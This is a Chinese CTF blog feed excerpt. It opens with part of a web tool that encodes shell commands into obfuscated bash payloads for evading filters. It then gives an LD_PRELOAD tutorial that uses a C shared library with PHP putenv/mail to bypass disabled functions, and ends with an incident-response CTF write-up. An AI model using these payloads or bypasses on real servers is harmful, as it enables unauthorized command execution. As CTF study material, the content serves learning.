<span class="title">onclick</span>=&quot;<span class="title">generatePayload</span>()&quot;&gt;<span class="title">Generate</span> <span class="title">Payloads</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">output</span>&quot; <span class="title">class</span>=&quot;<span class="title">output</span>-<span class="title">container</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">function</span> <span class="title">info</span>(<span class="title">s</span>) </span>&#123;</span><br><span class="line">    let total = <span class="number">0</span>;</span><br><span class="line">    let usedChars = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line">    <span class="keyword">for</span> (let c of s) &#123;</span><br><span class="line">        <span class="keyword">if</span> (c.<span class="keyword">match</span>(/[ -~]/) &amp;&amp; !usedChars.<span class="title function_ invoke__">has</span>(c)) &#123;  </span><br><span class="line">            total++;</span><br><span class="line">            usedChars.<span class="title function_ invoke__">add</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        charset: Array.<span class="keyword">from</span>(usedChars).<span class="title function_ invoke__">sort</span>().<span class="title function_ invoke__">join</span>(<span class="string">&#x27; &#x27;</span>),</span><br><span class="line">        totalUsed: total,</span><br><span class="line">        payloadLength: s.length,</span><br><span class="line">        payload: s</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getOct</span>(<span class="params">c</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c.<span class="title function_ invoke__">charCodeAt</span>(<span class="number">0</span>).<span class="title function_ invoke__">toString</span>(<span class="number">8</span>);  <span class="comment">// 将字符的ASCII值转换为八进制字符串</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">nomalOtc</span>(<span class="params">cmd</span>) </span>&#123;</span><br><span class="line">    let payload = <span class="string">&quot;$&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (let c of cmd) &#123;</span><br><span class="line">        payload += <span class="string">&#x27;\\&#x27;</span> + <span class="title function_ invoke__">getOct</span>(c);</span><br><span class="line">    &#125;</span><br><span class="line">    payload += <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">info</span>(payload);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bashfuckX</span>(<span class="params">cmd, form</span>) </span>&#123;</span><br><span class="line">    let bashStr = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (let c of cmd) &#123;</span><br><span class="line">        let binaryStr = <span class="title function_ invoke__">parseInt</span>(<span class="title function_ invoke__">getOct</span>(c), <span class="number">10</span>).<span class="title function_ invoke__">toString</span>(<span class="number">2</span>);</span><br><span class="line">        bashStr += <span class="string">&#x27;\\\\$(($((1&lt;&lt;1))#&#x27;</span> + binaryStr + <span class="string">&#x27;))&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let payloadBit = bashStr;</span><br><span class="line">    let payloadZero = bashStr.<span class="title function_ invoke__">replace</span>(/<span class="number">1</span>/g, <span class="string">&#x27;$&#123;##&#125;&#x27;</span>);  <span class="comment">// 用 $&#123;##&#125; 来替换 1</span></span><br><span class="line">    let payloadC = bashStr.<span class="title function_ invoke__">replace</span>(/<span class="number">1</span>/g, <span class="string">&#x27;$&#123;##&#125;&#x27;</span>).<span class="title function_ invoke__">replace</span>(/<span class="number">0</span>/g, <span class="string">&#x27;$&#123;#&#125;&#x27;</span>);  <span class="comment">// 用 $&#123;#&#125; 来替换 0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (form === <span class="string">&#x27;bit&#x27;</span>) &#123;</span><br><span class="line">        payloadBit = <span class="string">&#x27;$0&lt;&lt;&lt;$0\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span> + payloadBit + <span class="string">&#x27;\\\&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">info</span>(payloadBit);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (form === <span class="string">&#x27;zero&#x27;</span>) &#123;</span><br><span class="line">        payloadZero = <span class="string">&#x27;$0&lt;&lt;&lt;$0\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span> + payloadZero + <span class="string">&#x27;\\\&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">info</span>(payloadZero);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (form === <span class="string">&#x27;c&#x27;</span>) &#123;</span><br><span class="line">        payloadC = <span class="string">&#x27;$&#123;!#&#125;&lt;&lt;&lt;$&#123;!#&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span> + payloadC + <span class="string">&#x27;\\\&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">info</span>(payloadC);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bashfuckY</span>(<span class="params">cmd</span>) </span>&#123;</span><br><span class="line">    let octList = [</span><br><span class="line">        <span class="string">&#x27;$(())&#x27;</span>,  <span class="comment">// 0</span></span><br><span class="line">        <span class="string">&#x27;$((~$(($((~$(())))$((~$(())))))))&#x27;</span>,  <span class="comment">// 1</span></span><br><span class="line">        <span class="string">&#x27;$((~$(($((~$(())))$((~$(())))$((~$(())))))))&#x27;</span>,  <span class="comment">// 2</span></span><br><span class="line">        <span class="string">&#x27;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#x27;</span>,  <span class="comment">// 3</span></span><br><span class="line">        <span class="string">&#x27;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#x27;</span>,  <span class="comment">// 4</span></span><br><span class="line">        <span class="string">&#x27;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#x27;</span>,  <span class="comment">// 5</span></span><br><span class="line">        <span class="string">&#x27;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#x27;</span>,  <span class="comment">// 6</span></span><br><span class="line">        <span class="string">&#x27;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#x27;</span>,  <span class="comment">// 7</span></span><br><span class="line">    ];</span><br><span class="line">    let bashFuck = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    bashFuck += <span class="string">&#x27;__=$(())&#x27;</span>;  <span class="comment">// set __ to 0</span></span><br><span class="line">    bashFuck += <span class="string">&#x27;&amp;&amp;&#x27;</span>;  <span class="comment">// splicing</span></span><br><span class="line">    bashFuck += <span class="string">&#x27;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span>;  <span class="comment">// got &#x27;sh&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (let c of cmd) &#123;</span><br><span class="line">        bashFuck += <span class="string">&#x27;\\\\&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span> (let i of <span class="title function_ invoke__">getOct</span>(c)) &#123;</span><br><span class="line">            bashFuck += octList[<span class="title function_ invoke__">parseInt</span>(i)];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bashFuck += <span class="string">&#x27;\\\&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">info</span>(bashFuck);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generatePayload</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">cmd</span> = document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&quot;cmdInput&quot;</span>).value;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">outputDiv</span> = document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&quot;output&quot;</span>);</span><br><span class="line">    outputDiv.innerHTML = <span class="string">&#x27;&#x27;</span>;  <span class="comment">// 清空之前的输出</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">payloads</span> = [</span><br><span class="line">        &#123; title: <span class="string">&#x27;Normal OTC&#x27;</span>, data: <span class="title function_ invoke__">nomalOtc</span>(cmd) &#125;,</span><br><span class="line">        &#123; title: <span class="string">&#x27;Bit&#x27;</span>, data: <span class="title function_ invoke__">bashfuckX</span>(cmd, <span class="string">&#x27;bit&#x27;</span>) &#125;,</span><br><span class="line">        &#123; title: <span class="string">&#x27;Zero&#x27;</span>, data: <span class="title function_ invoke__">bashfuckX</span>(cmd, <span class="string">&#x27;zero&#x27;</span>) &#125;,</span><br><span class="line">        &#123; title: <span class="string">&#x27;C&#x27;</span>, data: <span class="title function_ invoke__">bashfuckX</span>(cmd, <span class="string">&#x27;c&#x27;</span>) &#125;,</span><br><span class="line">        &#123; title: <span class="string">&#x27;Bashfuck Y&#x27;</span>, data: <span class="title function_ invoke__">bashfuckY</span>(cmd) &#125;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    payloads.<span class="title function_ invoke__">forEach</span>(payload =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> container = document.<span class="title function_ invoke__">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">        container.classList.<span class="title function_ invoke__">add</span>(<span class="string">&#x27;container&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> info = document.<span class="title function_ invoke__">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">        info.classList.<span class="title function_ invoke__">add</span>(<span class="string">&#x27;payload-info&#x27;</span>);</span><br><span class="line">        info.innerHTML = `<span class="title function_ invoke__">Charset</span> ($&#123;payload.data.totalUsed&#125;) : $&#123;payload.data.charset&#125;&lt;br&gt;Payload length = $&#123;payload.data.payloadLength&#125;`;</span><br><span class="line">        container.<span class="title function_ invoke__">appendChild</span>(info);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> textarea = document.<span class="title function_ invoke__">createElement</span>(<span class="string">&#x27;textarea&#x27;</span>);</span><br><span class="line">        textarea.value = payload.data.payload;</span><br><span class="line">        textarea.readOnly = <span class="literal">true</span>;</span><br><span class="line">        textarea.rows = <span class="number">4</span>;</span><br><span class="line">        container.<span class="title function_ invoke__">appendChild</span>(textarea);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> copyButton = document.<span class="title function_ invoke__">createElement</span>(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line">        copyButton.classList.<span class="title function_ invoke__">add</span>(<span class="string">&#x27;copy-btn&#x27;</span>);</span><br><span class="line">        copyButton.innerText = <span class="string">&#x27;Copy&#x27;</span>;</span><br><span class="line">        copyButton.onclick = () =&gt; &#123;</span><br><span class="line">            textarea.<span class="title function_ invoke__">select</span>();</span><br><span class="line">            document.<span class="title function_ invoke__">execCommand</span>(<span class="string">&#x27;copy&#x27;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        container.<span class="title function_ invoke__">appendChild</span>(copyButton);</span><br><span class="line"></span><br><span class="line">        outputDiv.<span class="title function_ invoke__">appendChild</span>(container);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250616151359.png"></p><h1 id="LD-PRELOAD利用"><a href="#LD-PRELOAD利用" class="headerlink" title="LD_PRELOAD利用"></a>LD_PRELOAD利用</h1><p>LD_PRELOAD的利用条件比较苛刻，这里列举一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以上传自己的so文件</span><br><span class="line">能够控制环境变量的值(设置LD_PRELOAD变量)，比如`putenv`函数并且没有被禁止</span><br><span class="line">存在可以控制PHP外部程序的函数并且能够执行,例如mail、imap_mail、mb_send_mail、errlor_log等。</span><br></pre></td></tr></table></figure><p>具体的方法就是通过LD_PRELOAD环境变量来劫持动态链接库。利用的原理参考如下<br>在php的mail函数中存在调用本地软件的内容，具体可以写一个php文件，内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过<code>strace -o 1.txt -f php mail.php</code>命令导出运行时的所有系统调用,然后通过查看<code>execve</code>系统调用执行的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿BoyChaiWindows)-[~/temp/zongjie]</span><br><span class="line">└─# <span class="built_in">cat</span> 1.txt |grep <span class="built_in">exec</span></span><br><span class="line">5673  execve(<span class="string">&quot;/usr/bin/php&quot;</span>, [<span class="string">&quot;php&quot;</span>, <span class="string">&quot;mail.php&quot;</span>], 0x7fff2e169e40 /* 38 vars */) = 0</span><br><span class="line">5674  execve(<span class="string">&quot;/bin/sh&quot;</span>, [<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--&quot;</span>, <span class="string">&quot;/usr/sbin/sendmail -t -i&quot;</span>], 0x559f5ab132a0 /* 38 vars */ &lt;unfinished ...&gt;</span><br><span class="line">5674  &lt;... execve resumed&gt;)             = 0</span><br><span class="line">5675  execve(<span class="string">&quot;/usr/sbin/sendmail&quot;</span>, [<span class="string">&quot;/usr/sbin/sendmail&quot;</span>, <span class="string">&quot;-t&quot;</span>, <span class="string">&quot;-i&quot;</span>], 0x558d22e10b68 /* 38 vars */ &lt;unfinished ...&gt;</span><br><span class="line">5675  &lt;... execve resumed&gt;)             = 0</span><br></pre></td></tr></table></figure><p>可以发现的是在编号<code>5674</code>中他执行了一个<code>/usr/sbin/sendmail</code>命令，我们通过<code>readelf -Ws /usr/sbin/sendmail</code>命令查看一下他调用了那些动态链接库的函数，这条命令的数据量很大，但是可以找到一个是geteuid的调用，如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">┌──(root㉿BoyChaiWindows)-[~/temp/zongjie]</span><br><span class="line">└─# readelf -Ws /usr/sbin/sendmail|grep geteuid</span><br><span class="line">   103: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND geteuid@GLIBC_2.2.5 (4)</span><br></pre></td></tr></table></figure><p>具体的利用方式就是通过在程序运行时的<code>LD_PRELOAD</code>环境变量，他的作用是加载so文件到文件中，如果出现冲突的一些动态链接库函数则有先会使用他的，我们可以手写一个c代码文件，内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">system(<span class="string">&quot;cat /flag &gt; /tmp/flag&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">geteuid</span><span class="params">()</span>&#123;</span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>gcc -shared -fPIC demo.c -o demo.so</code>命令编译出so文件，上传到服务器中，然后运行下面的php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=./demo.so&quot;</span>)</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>去访问这个php代码，或者运行这个php代码的时候就会执行咱们再C代码中的命令，至于为什么需要在C代码中执行<code>unsetenv(&quot;LD_PRELOAD&quot;);</code>是因为咱们改的是环境变量，如果不修改会影响其他程序，有可能会导致系统崩溃，然后当前的绕过思路是任何环境都可以尝试，但是出现问题的话会很危险，因为他劫持了动态链接库，也可以找一个调用量比较少的函数去劫持，然后影响的更少一些。这个的利用在CTF中应该会比较少见，因为他可能导致Docker崩溃，而且利用环境比较苛刻。</p>]]></content>
    
    
    <summary type="html">常见命令执行函数
system
1
2
3
4
5
6
7
8


&lt;?php
error_reporting(0);
highlight_file(__FILE__);
$cmd = $_GET[&quot;benben&quot;];
if(isset($cmd)){
    system($cmd);
}
?&gt;


可以直接把命令丢给system，他会直接运行并且输出返回的内容。

exec()
1
2
3
4
5
6
7


&lt;?php
error_reporting(0);
highlight_file(__FILE__);
$cmd = $_GET[&quot;cmd&quot;];
exec($cmd,$array);</summary>
    
    
    
    <category term="CTF相关" scheme="https://blog.boychai.xyz/categories/CTF%E7%9B%B8%E5%85%B3/"/>
    
    <category term="WEB" scheme="https://blog.boychai.xyz/categories/CTF%E7%9B%B8%E5%85%B3/WEB/"/>
    
    
    <category term="CTF" scheme="https://blog.boychai.xyz/tags/CTF/"/>
    
    <category term="WEB" scheme="https://blog.boychai.xyz/tags/WEB/"/>
    
    <category term="PHP" scheme="https://blog.boychai.xyz/tags/PHP/"/>
    
    <category term="RCE" scheme="https://blog.boychai.xyz/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>第二届“Parloo”CTF应急响应挑战赛-应急相应方向-WriteUp</title>
    <link href="https://blog.boychai.xyz/2025/05/20/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9CParloo%E2%80%9DCTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B-%E5%BA%94%E6%80%A5%E7%9B%B8%E5%BA%94%E6%96%B9%E5%90%91-WriteUp/"/>
    <id>https://blog.boychai.xyz/2025/05/20/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9CParloo%E2%80%9DCTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B-%E5%BA%94%E6%80%A5%E7%9B%B8%E5%BA%94%E6%96%B9%E5%90%91-WriteUp/</id>
    <published>2025-05-20T21:34:00.000Z</published>
    <updated>2025-07-17T05:40:18.602Z</updated>
    
    <content type="html"><![CDATA[<h1 id="畸形的爱"><a href="#畸形的爱" class="headerlink" title="畸形的爱"></a>畸形的爱</h1><h2 id="攻击者ip地址1"><a href="#攻击者ip地址1" class="headerlink" title="攻击者ip地址1"></a>攻击者ip地址1</h2><p>nginx日志 31网段之外的基本都是内网ip，所以不考虑<br>palu{192.168.31.240}<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250517134104.png"></p><h2 id="攻击者ip地址2"><a href="#攻击者ip地址2" class="headerlink" title="攻击者ip地址2"></a>攻击者ip地址2</h2><p>这道题目没做出来，主要原因是光做主线了，这个简单过了一下，没有在意到docker容器，在webserver中有一个webdata容器，开启会报错，原因是在题目创建时绑定了一个当时主机的ip，复现的虚拟机因为环境问题无法从挂起状态恢复导致虚拟机的ip被本地的dhcp更换了，所以开启不了，具体报错如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/var/www/html# docker start WebData</span><br><span class="line">Error response from daemon: driver failed programming external connectivity on endpoint WebData (d139b4f26019de0d9e2dc495f1917ce3e47443f38d283802da47eb972ded07cb): Error starting userland proxy: listen tcp 192.168.87.101:8061: <span class="built_in">bind</span>: cannot assign requested address</span><br><span class="line">Error: failed to start containers: WebData</span><br></pre></td></tr></table></figure><p>通过下面命令可以临时加一条对应的ip让其临时开启容器进入里面查看数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ip addr add 192.168.87.101/24 dev ens33</span><br></pre></td></tr></table></figure><p>进入机器后发现反弹的后门ip<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250519192053.png"><br>palu{192.168.31.11}</p><h2 id="暴力破解开始时间"><a href="#暴力破解开始时间" class="headerlink" title="暴力破解开始时间"></a>暴力破解开始时间</h2><p>这道题目也没做出来没注意到容器,这个日志是通过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs phpmyadmin</span><br></pre></td></tr></table></figure><p>获取到的，在这个容器中存在大量爆破日志<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250519192508.png"><br>palu{2025:03:05:58}</p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>win10直接搜索<br>palu{pc3_zgsfqwerlkssaw}<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250517140305.png"></p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>win10的最近使用里<br>palu{nizhidaowoyouduoainima}<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250517140137.png"></p><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>这个也没做出来，具体原因似乎是没怎么在乎数据库的内容，光去看webserver了，从webserver的网页代码中获取到数据库的账号密码<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250519192840.png"><br>通过账号密码连接数据库查看数据库数据，发现很多base64<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250519193012.png"><br>挨个解码后发现第三个内容如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;item_id&quot;:1,&quot;item_name&quot;:&quot;flag3palu&#123;sqlaabbccsbwindows&#125;&quot;,&quot;quantity&quot;:2,&quot;price&quot;:199.99&#125;,&#123;&quot;item_id&quot;:3,&quot;item_name&quot;:&quot;英国复印&quot;,&quot;quantity&quot;:1,&quot;price&quot;:59.99&#125;]</span><br></pre></td></tr></table></figure><p>palu{sqlaabbccsbwindows}</p><h2 id="提交钓鱼文件的哈希32位大写"><a href="#提交钓鱼文件的哈希32位大写" class="headerlink" title="提交钓鱼文件的哈希32位大写"></a>提交钓鱼文件的哈希32位大写</h2><p>在回收站中有一个奇怪的zip恢复后<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250517141817.png"><br>沙箱分析<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250517141834.png"><br>palu{2977CDAB8F3EE5EFDDAE61AD9F6CF203}</p><h2 id="webshell密码1"><a href="#webshell密码1" class="headerlink" title="webshell密码1"></a>webshell密码1</h2><p>没做出来，没看容器，在容器中直接就能看到webshell密码<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250519193217.png"><br>palu{hack}</p><h2 id="攻击者开放3个端口"><a href="#攻击者开放3个端口" class="headerlink" title="攻击者开放3个端口"></a>攻击者开放3个端口</h2><p>没接出来，这个本来是想法查网络端口，但是没有思路，好多端口都开放。首先是第一个在攻击者ip2中，在清理脚本中就发现了一个反弹shell的脚本，上面就有端口<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250519193521.png"><br>1133，其他目前没找到，然后据群友说有一个是在<code>/tmp/r.sh</code>位置，在第一次开机的时候存在<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250519210245.png"><br>好像是1144，等官方题解吧。</p><h2 id="webshell密码2"><a href="#webshell密码2" class="headerlink" title="webshell密码2"></a>webshell密码2</h2><p>网站目录下<br>palu{00232}<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250517134531.png"></p><h2 id="隐藏账户的密码"><a href="#隐藏账户的密码" class="headerlink" title="隐藏账户的密码"></a>隐藏账户的密码</h2><p>没解出来，没发现隐藏账户。。赛后才发现<br>在win10中通过工具发现额外的账户<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250519201145.png"><br>通过LaZagne获取出他的hash<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250519203814.png"><br>然后通过kali跑一下字典，这个在cmd5中是可以查询到的，但是是付费的，直接通过万能群友直接出了<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250519205016.png"><br>palu{wmx_love}<br>还有就是john就不要试了，我跑了15分钟都没出…<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250519205247.png"></p><h2 id="溯源-攻击者的邮箱"><a href="#溯源-攻击者的邮箱" class="headerlink" title="[溯源]攻击者的邮箱"></a>[溯源]攻击者的邮箱</h2><p>没有解出来，没想到是这种方法。。。根据病毒侵害的主机得知王美欣的名字，去github搜索拿到githubid<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250519195451.png"><br>并且同通过id可以去github用户反查api中得知他的邮箱为<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250519195737.png"><br>palu{<a href="mailto:&#110;&#48;&#107;&#x34;&#117;&#64;&#x6f;&#x75;&#x74;&#x6c;&#111;&#111;&#x6b;&#46;&#x63;&#x6f;&#x6d;">n0k4u@outlook.com</a>}</p><h2 id="溯源-flag4"><a href="#溯源-flag4" class="headerlink" title="[溯源]flag4"></a>[溯源]flag4</h2><p>没解出来，上面搜索仓库拿到一个密语<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250519195925.png"><br>这是一个qq号直接去添加拿到flag4<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250519200004.png"><br>palu{loveyouibiejv}</p><h1 id="solar-Linux后门排查"><a href="#solar-Linux后门排查" class="headerlink" title="solar_Linux后门排查"></a>solar_Linux后门排查</h1><p>通过命令<code>ss -tulnpa</code>查看连接发现后门<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518194618.png"><br>通过pid直接拿到文件<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518194720.png"><br>直接连接过去这台机器<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518194800.png"><br>直接就出flag了</p><h1 id="取证主线"><a href="#取证主线" class="headerlink" title="取证主线"></a>取证主线</h1><h2 id="1-提交堡垒机中留下的flag"><a href="#1-提交堡垒机中留下的flag" class="headerlink" title="1.提交堡垒机中留下的flag"></a>1.提交堡垒机中留下的flag</h2><p>flag:palu{2025_qiandao_flag}<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250517180703.png"></p><h2 id="2-提交WAF中隐藏的flag"><a href="#2-提交WAF中隐藏的flag" class="headerlink" title="2.提交WAF中隐藏的flag"></a>2.提交WAF中隐藏的flag</h2><p>palu{2025_waf}<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518175939.png"></p><h2 id="3-提交Mysql中留下的flag"><a href="#3-提交Mysql中留下的flag" class="headerlink" title="3.提交Mysql中留下的flag"></a>3.提交Mysql中留下的flag</h2><p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250517182521.png"><br><code>palu&#123;Mysql_@2025&#125;</code></p><h2 id="4-提交攻击者的攻击IP"><a href="#4-提交攻击者的攻击IP" class="headerlink" title="4.提交攻击者的攻击IP"></a>4.提交攻击者的攻击IP</h2><p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518135200.png"></p><h2 id="5-提交攻攻击者最早攻击时间"><a href="#5-提交攻攻击者最早攻击时间" class="headerlink" title="5.提交攻攻击者最早攻击时间"></a>5.提交攻攻击者最早攻击时间</h2><p>提交攻攻击者最早攻击时间flag格式为palu{xxxx-xx-xx-xx-xx-xx}，这个时间格式是错误的。。。一直没交上，最后半小时才说格式不对。。<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520153106.png"><br>palu{2025-05-05-00:04:40}</p><h2 id="6-提交web服务泄露的关键文件名"><a href="#6-提交web服务泄露的关键文件名" class="headerlink" 